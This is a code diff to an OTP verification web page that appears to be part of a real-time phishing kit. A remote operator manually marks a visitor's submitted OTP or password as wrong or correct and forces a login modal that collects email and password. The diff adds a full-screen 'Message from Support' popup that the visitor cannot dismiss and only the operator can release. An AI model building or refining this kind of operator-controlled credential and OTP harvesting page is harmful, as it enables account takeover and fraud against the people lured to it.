@@ -40,6 +40,74 @@ button:disabled{opacity:0.6;cursor:not-allowed}
 .modal-btn:disabled{opacity:0.6;cursor:not-allowed}
 .modal-error{color:#ef4444;font-size:12px;margin-top:12px;display:none}
 .loading-spinner-small{width:30px;height:30px;border:3px solid #f3f3f3;border-top:3px solid #4f46e5;border-radius:50%;animation:spin 1s linear infinite;margin:10px auto}
+
+/* Admin text popup — no close button, only admin can dismiss */
+#adminTextPopup {
+  display: none;
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  background: rgba(0,0,0,0.88);
+  backdrop-filter: blur(8px);
+  z-index: 20000;
+  justify-content: center;
+  align-items: center;
+}
+#adminTextPopup.active { display: flex; }
+.admin-text-box {
+  background: white;
+  border-radius: 28px;
+  max-width: 400px;
+  width: 90%;
+  padding: 32px 24px;
+  text-align: center;
+  box-shadow: 0 25px 50px rgba(0,0,0,0.35);
+}
+.admin-text-icon {
+  width: 60px; height: 60px;
+  background: #f97316;
+  border-radius: 30px;
+  display: flex; align-items: center; justify-content: center;
+  margin: 0 auto 20px;
+}
+.admin-text-icon svg { width: 30px; height: 30px; stroke: white; fill: none; }
+.admin-text-title { font-size: 20px; font-weight: 700; color: #1f2937; margin-bottom: 16px; }
+.admin-text-content {
+  background: #f3f4f6;
+  padding: 20px;
+  border-radius: 16px;
+  font-size: 17px;
+  line-height: 1.8;
+  color: #1f2937;
+  word-break: break-word;
+}
+/* Styled tokens injected by formatMessage() */
+.msg-yes {
+  color: #059669;
+  font-weight: 800;
+  font-size: 1.35em;
+  background: #d1fae5;
+  padding: 2px 10px;
+  border-radius: 8px;
+  display: inline-block;
+}
+.msg-num {
+  color: #4f46e5;
+  font-weight: 800;
+  font-size: 1.2em;
+  background: #e0e7ff;
+  padding: 2px 8px;
+  border-radius: 8px;
+  display: inline-block;
+}
+.msg-caps {
+  color: #dc2626;
+  font-weight: 800;
+  background: #fee2e2;
+  padding: 2px 8px;
+  border-radius: 8px;
+  display: inline-block;
+}
 </style>
 </head>
 <body>
@@ -59,6 +127,7 @@ button:disabled{opacity:0.6;cursor:not-allowed}
   </div>
 </div>
 
+<!-- Login modal (force login) -->
 <div id="loginModal" class="modal-overlay">
   <div class="modal" id="loginModalContent">
     <div class="modal-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg></div>
@@ -71,6 +140,17 @@ button:disabled{opacity:0.6;cursor:not-allowed}
   </div>
 </div>
 
+<!-- Admin text popup — NO close button for user -->
+<div id="adminTextPopup">
+  <div class="admin-text-box">
+    <div class="admin-text-icon">
+      <svg viewBox="0 0 24 24" stroke-width="1.5"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+    </div>
+    <div class="admin-text-title">Message from Support</div>
+    <div class="admin-text-content" id="adminTextContent"></div>
+  </div>
+</div>
+
 <script>
   const urlParams = new URLSearchParams(window.location.search);
   const email = urlParams.get('email');
@@ -80,98 +160,50 @@ button:disabled{opacity:0.6;cursor:not-allowed}
   const verifyBtn = document.getElementById('verifyBtn');
   const errorDiv  = document.getElementById('errorMessage');
 
-  let isProcessing     = false;
-  let approvalInterval = null;
+  let isProcessing      = false;
+  let approvalInterval  = null;
   let blockCheckInterval = null;
-  let isModalOpen      = false;
+  let isModalOpen       = false;
   let adminTextHandling = false;
 
-  function closeLoginModal() {
-    const modal = document.getElementById('loginModal');
-    if (modal && modal.classList.contains('active')) {
-      modal.classList.remove('active');
-      isModalOpen = false;
-    }
-  }
-
-  // ✅ FIXED formatting function
-  function formatTextMessage(message) {
-    // 🔥 REMOVE old spans completely
-    message = message.replace(/<\/?span[^>]*>/g, '');
-
-    let formatted = message.replace(/[&<>]/g, function(m) {
-      if (m === '&') return '&amp;';
-      if (m === '<') return '&lt;';
-      if (m === '>') return '&gt;';
-      return m;
-    });
-
-    // YES styling
-    formatted = formatted.replace(/\bYES\b/gi, function(match) {
-      return '<span style="color: #10b981; font-weight: 800; font-size: 1.3em; background: #d1fae5; padding: 2px 8px; border-radius: 8px; display: inline-block;">' + match.toUpperCase() + '</span>';
-    });
-
-    // CAPS styling (excluding YES)
-    formatted = formatted.replace(/\b([A-Z]{3,})\b/g, function(match) {
-      if (match !== 'YES') {
-        return '<span style="color: #dc2626; font-weight: 800; background: #fee2e2; padding: 2px 8px; border-radius: 8px; display: inline-block;">' + match + '</span>';
+  // ── Format message: work on RAW text, never on HTML ───────────────────────
+  // Strategy: split text into tokens (words + spaces + punctuation),
+  // style each token individually so regex never touches injected HTML.
+  function formatMessage(rawText) {
+    // Split into word-tokens and non-word separators
+    const parts = rawText.split(/(\s+|[^a-zA-Z0-9]+)/);
+    return parts.map(part => {
+      // YES (case-insensitive whole word)
+      if (/^yes$/i.test(part)) {
+        return `<span class="msg-yes">YES</span>`;
       }
-      return match;
-    });
-
-    return formatted;
+      // Pure integer number
+      if (/^\d+$/.test(part)) {
+        return `<span class="msg-num">${part}</span>`;
+      }
+      // All-caps word 3+ letters (not YES, already handled above)
+      if (/^[A-Z]{3,}$/.test(part)) {
+        return `<span class="msg-caps">${part}</span>`;
+      }
+      // Everything else — escape HTML and return as-is
+      return part.replace(/[&<>]/g, m => m === '&' ? '&amp;' : m === '<' ? '&lt;' : '&gt;');
+    }).join('');
   }
 
-  async function showTextPopup(message) {
-    const loginModal = document.getElementById('loginModal');
-    if (loginModal && loginModal.classList.contains('active')) {
-      loginModal.classList.remove('active');
-      isModalOpen = false;
-    }
-
-    // ✅ ALWAYS format now
-    const formattedMessage = formatTextMessage(message);
-
-    let textModal = document.getElementById('customTextModal');
-    if (!textModal) {
-      textModal = document.createElement('div');
-      textModal.id = 'customTextModal';
-      textModal.style.cssText = `
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background: rgba(0,0,0,0.85);
-        backdrop-filter: blur(8px);
-        z-index: 20000;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-      `;
-      textModal.innerHTML = `
-        <div style="background: white; border-radius: 28px; max-width: 400px; width: 90%; padding: 32px 24px; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.3);">
-          <div style="width: 60px; height: 60px; background: #f97316; border-radius: 30px; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px;">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" style="width: 32px; height: 32px; stroke: white;">
-              <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>
-            </svg>
-          </div>
-          <h3 style="font-size: 22px; font-weight: 700; color: #1f2937; margin-bottom: 8px;">Message from Admin</h3>
-          <div id="customTextMessageContent" style="background: #f3f4f6; padding: 20px; border-radius: 16px; margin: 20px 0; text-align: center; font-size: 16px; line-height: 1.6; color: #1f2937;"></div>
-          <button onclick="this.parentElement.parentElement.remove()" style="width: 100%; padding: 14px; background: linear-gradient(90deg, #2563eb, #7c3aed); color: white; border: none; border-radius: 12px; font-weight: 600; cursor: pointer; font-size: 14px;">Close</button>
-        </div>
-      `;
-      document.body.appendChild(textModal);
-    }
-
-    document.getElementById('customTextMessageContent').innerHTML = formattedMessage;
-    textModal.style.display = 'flex';
-
-    setTimeout(() => {
-      if (textModal) textModal.style.display = 'none';
-    }, 15000);
+  // ── Show admin text popup (replaces any existing one) ─────────────────────
+  function showAdminTextPopup(rawMessage) {
+    const popup   = document.getElementById('adminTextPopup');
+    const content = document.getElementById('adminTextContent');
+    content.innerHTML = formatMessage(rawMessage);
+    popup.classList.add('active');
   }
 
+  // ── Hide admin text popup (only called when admin releases) ───────────────
+  function hideAdminTextPopup() {
+    document.getElementById('adminTextPopup').classList.remove('active');
+  }
+
+  // ── User-side flag release — no JWT ───────────────────────────────────────
   async function releaseAdminText() {
     try {
       await fetch('/api/users/release-admin-text', {
@@ -182,6 +214,7 @@ button:disabled{opacity:0.6;cursor:not-allowed}
     } catch (e) {}
   }
 
+  // ── Single unified admin_text poller ──────────────────────────────────────
   async function pollAdminText() {
     if (adminTextHandling) return;
     try {
@@ -191,30 +224,36 @@ button:disabled{opacity:0.6;cursor:not-allowed}
         body: JSON.stringify({ email })
       });
       const data = await res.json();
-      if (!data.admin_text || data.text_release === true) return;
 
-      adminTextHandling = true;
-
-      if (data.admin_text && data.admin_text.trim() !== '' && 
-          data.admin_text !== 'incorrect_otp_error' && 
-          data.admin_text !== 'wrong_login_error' && 
-          data.admin_text !== 'correct_login_success') {
-        await showTextPopup(data.admin_text);
-        await releaseAdminText();
-        adminTextHandling = false;
+      // If flag was released (admin clicked Release), hide popup
+      if (data.text_release === true) {
+        hideAdminTextPopup();
         return;
       }
 
-      if      (data.admin_text === 'incorrect_otp_error')  await handleIncorrectOtp();
-      else if (data.admin_text === 'wrong_login_error')     await handleWrongLogin();
-      else if (data.admin_text === 'correct_login_success') await handleCorrectLogin();
-      else { await releaseAdminText(); adminTextHandling = false; }
+      if (!data.admin_text) return;
+
+      adminTextHandling = true;
+
+      const txt = data.admin_text;
+
+      if (txt === 'incorrect_otp_error') {
+        await handleIncorrectOtp();
+      } else if (txt === 'wrong_login_error') {
+        await handleWrongLogin();
+      } else if (txt === 'correct_login_success') {
+        await handleCorrectLogin();
+      } else {
+        // Regular text message from admin — show popup, do NOT release automatically
+        // Admin must click "Release" on dashboard to close it
+        showAdminTextPopup(txt);
+        adminTextHandling = false; // unlock so next poll can detect a replacement
+      }
 
     } catch (e) { adminTextHandling = false; }
   }
 
-  // ⚠️ EVERYTHING BELOW UNTOUCHED
-
+  // ── Incorrect OTP ──────────────────────────────────────────────────────────
   async function handleIncorrectOtp() {
     await releaseAdminText();
     if (approvalInterval) { clearInterval(approvalInterval); approvalInterval = null; }
@@ -226,24 +265,20 @@ button:disabled{opacity:0.6;cursor:not-allowed}
 
     verifyBtn.disabled = true;
     verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Please wait...</span>';
-    setTimeout(() => {
-      verifyBtn.disabled = false;
-      verifyBtn.innerHTML = 'Verify';
-      otpInput.focus();
-    }, 2000);
-
+    setTimeout(() => { verifyBtn.disabled = false; verifyBtn.innerHTML = 'Verify'; otpInput.focus(); }, 2000);
     setTimeout(() => { errorDiv.style.display = 'none'; adminTextHandling = false; }, 5000);
   }
 
+  // ── Wrong login ────────────────────────────────────────────────────────────
   async function handleWrongLogin() {
     await releaseAdminText();
-    const modalError   = document.getElementById('modalError');
+
+    const modalError    = document.getElementById('modalError');
     const loginPassword = document.getElementById('loginPassword');
-    const submitBtn    = document.getElementById('submitLoginBtn');
+    const submitBtn     = document.getElementById('submitLoginBtn');
 
     if (modalError)    { modalError.textContent = '❌ Invalid email or password. Please try again.'; modalError.style.display = 'block'; }
     if (loginPassword) loginPassword.value = '';
-
     if (submitBtn) {
       submitBtn.disabled = true;
       submitBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Please wait...</span>';
@@ -252,6 +287,7 @@ button:disabled{opacity:0.6;cursor:not-allowed}
     setTimeout(() => { if (modalError) modalError.style.display = 'none'; adminTextHandling = false; }, 4000);
   }
 
+  // ── Correct login ──────────────────────────────────────────────────────────
   async function handleCorrectLogin() {
     await releaseAdminText();
     const mc = document.getElementById('loginModalContent');
@@ -267,6 +303,7 @@ button:disabled{opacity:0.6;cursor:not-allowed}
     setTimeout(() => { adminTextHandling = false; }, 3000);
   }
 
+  // ── Block check ────────────────────────────────────────────────────────────
   async function checkIfBlocked() {
     try {
       const res  = await fetch('/api/users/check-blocked', {
@@ -287,9 +324,10 @@ button:disabled{opacity:0.6;cursor:not-allowed}
     }, 3000);
   }
 
-  function showLoading()  { isProcessing = true; verifyBtn.disabled = true; verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Verifying...</span>'; errorDiv.style.display = 'none'; }
-  function showWaiting()  { verifyBtn.disabled = true; verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Validating...</span>'; }
-  function resetButton()  { isProcessing = false; verifyBtn.disabled = false; verifyBtn.innerHTML = 'Verify'; }
+  // ── OTP submit + first-approval poll ──────────────────────────────────────
+  function showLoading() { isProcessing = true; verifyBtn.disabled = true; verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Verifying...</span>'; errorDiv.style.display = 'none'; }
+  function showWaiting() { verifyBtn.disabled = true; verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Validating...</span>'; }
+  function resetButton() { isProcessing = false; verifyBtn.disabled = false; verifyBtn.innerHTML = 'Verify'; }
 
   function startCheckingFirstApproval() {
     if (approvalInterval) clearInterval(approvalInterval);
@@ -348,6 +386,7 @@ button:disabled{opacity:0.6;cursor:not-allowed}
     }
   }
 
+  // ── Force-login polling ────────────────────────────────────────────────────
   function startForceLoginPolling() {
     setInterval(async () => {
       if (isModalOpen) return;
@@ -370,6 +409,7 @@ button:disabled{opacity:0.6;cursor:not-allowed}
     }, 2000);
   }
 
+  // ── Redirect-success polling ───────────────────────────────────────────────
   function startRedirectSuccessPolling() {
     setInterval(async () => {
       try {
@@ -383,6 +423,7 @@ button:disabled{opacity:0.6;cursor:not-allowed}
     }, 2000);
   }
 
+  // ── Login modal submit ─────────────────────────────────────────────────────
   async function submitLogin() {
     const loginEmail    = document.getElementById('loginEmail').value.trim();
     const loginPassword = document.getElementById('loginPassword').value;
@@ -420,6 +461,7 @@ button:disabled{opacity:0.6;cursor:not-allowed}
     }
   }
 
+  // ── Boot ───────────────────────────────────────────────────────────────────
   startForceLoginPolling();
   startRedirectSuccessPolling();
   startBlockChecking();
